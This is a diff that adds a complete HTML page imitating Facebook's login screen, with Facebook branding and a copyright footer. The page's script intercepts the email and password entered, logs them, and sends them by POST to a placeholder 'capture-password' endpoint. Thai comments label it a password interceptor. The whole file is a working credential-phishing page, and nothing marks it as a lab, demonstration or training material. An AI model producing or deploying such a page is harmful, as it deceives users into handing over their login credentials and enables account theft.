@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Clone</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 980px;
+        }
+        .welcome {
+            max-width: 400px;
+        }
+        .welcome h1 {
+            color: #1877f2;
+            font-size: 56px;
+            margin-bottom: 10px;
+        }
+        .welcome p {
+            font-size: 24px;
+        }
+        .login-container {
+            width: 396px;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            background-color: #1877f2;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #166fe5;
+        }
+        .login-container a {
+            display: block;
+            text-align: center;
+            margin-top: 12px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            text-align: center;
+            padding: 10px 0;
+            color: #737373;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="welcome">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="login-container">
+            <form id="loginForm">
+                <input type="text" id="email" placeholder="Email address or phone number" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+                <a href="#">Forgotten password?</a>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+        © 2024 Facebook
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            console.log('Email:', email, 'Password:', password); // ตัวดักรหัส
+
+            // ส่งข้อมูลรหัสผ่านไปยังเซิร์ฟเวอร์
+            fetch('https://your-server.com/capture-password', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email: email, password: password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                // ทำการดำเนินการเพิ่มเติมหากจำเป็น
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
